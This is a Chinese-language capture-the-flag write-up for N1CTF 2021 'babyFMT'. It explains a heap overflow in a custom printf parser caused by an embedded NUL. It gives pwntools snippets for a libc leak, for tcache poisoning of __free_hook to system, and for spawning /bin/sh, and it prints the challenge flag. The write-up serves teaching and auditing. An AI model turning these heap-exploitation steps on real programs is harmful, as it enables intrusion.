# N1CTF 2021 - babyFMT

## 题目简述

程序自己实现了 `babyscanf` 与 `babyprintf`。前者只支持 `%d/%s`，后者以 `%m` 输出整数、以 `%r` 输出最多 16 字节字符串。菜单本身没有明显 UAF，但 `show()` 允许用户控制 `babyprintf` 的格式串，而 `babyprintf` 对嵌入 NUL 的格式串存在“分配长度与解析长度不一致”，最终形成堆溢出。

官方利用先泄露 libc，再覆盖 tcache 单链表指针，把 `__free_hook` 改为 `system`，最后在释放包含 `/bin/sh` 的格式化缓冲区时取得 shell。

## 解题过程

### 找到 NUL 后继续解析的堆溢出

`babyprintf` 先用 `strlen(fmt)` 计算长度，并为遇到的每个 `%` 额外预留 `0x10` 字节：

```c
int n = strlen(fmt);
for (char *p = fmt; *p; p++) {
    if (*p == '%') n += 0x10;
}
char *out = malloc(n);
```

随后解析 `%m`、`%r`；未知格式说明符则把该字符的 ASCII 数值转成十进制。输入 `b"%\x00" + payload` 时发生关键分歧：

1. `strlen` 在 NUL 处停止，只得到长度 1，并因开头 `%` 分配 $1+0x10=0x11$ 字节。
2. 解析器看到 `%` 后先执行一次 `fmt++`，把 NUL 当成未知说明符处理。
3. 本轮末尾再次 `fmt++`，指针越过 NUL，继续复制 NUL 后的 `payload`。

因此 NUL 后任意长度的数据都会写出 0x11 字节堆块。漏洞触发形态是：

```python
show(index, b"%\x00" + padding + overwrite)
```

### 泄露 libc

先申请一个 `0x450` 大块并释放，使其进入 unsorted bin；再用较小申请复用相关区域。`author` 留空后，残留的 unsorted-bin 指针可以通过 `%r` 被复制出来：

```python
add(0x450, b"admin", b"a")
add(0x100, b"123", b"123")
delete(0)
add(0x50, b"", b"aaaaaa")
show(0, b"AAAA%rBBBB")
```

取 `AAAA` 与 `BBBB` 之间的 6 字节指针并减去该 libc 版本的 `0x1ebfe0`，得到基址。官方附件对应 glibc 2.31，后续目标为 `__free_hook` 与 `system`。

### tcache poisoning 劫持释放钩子

准备并释放三个 `0x50` 级别的块后，调用 `show(1, ...)` 触发 NUL 堆溢出，将相邻 tcache chunk 的 `next` 改为 `__free_hook - 0x10`：

```python
show(1, b"%\x00" + cyclic(32) + p64(libc.sym["__free_hook"] - 0x10))
```

随后两次同尺寸申请，第二次就落到 `__free_hook` 附近；利用 `author/content` 布局把 `system` 地址写入钩子。最后让 `babyprintf` 为 `/bin/sh` 生成临时输出缓冲区：

```python
show(1, b"/bin/sh\x00")
```

函数末尾执行 `free(out)` 时等价于 `system(out)`，从而取得 shell。仓库部署目录中的 flag 为：

```text
n1ctf{BBBBBBaby_format_string}
```

## 方法总结

本题的本质不是 libc `printf` 格式化串漏洞，而是自定义解析器对 NUL 的状态推进错误。审计自定义编码/格式函数时，应比较“长度预扫描”和“真正消费输入”的终止条件是否完全一致。利用层面则是经典的 unsorted-bin 泄露加 tcache poisoning，但必须考虑中途多次 `babyprintf` 分配，避免提前破坏必经的堆块。
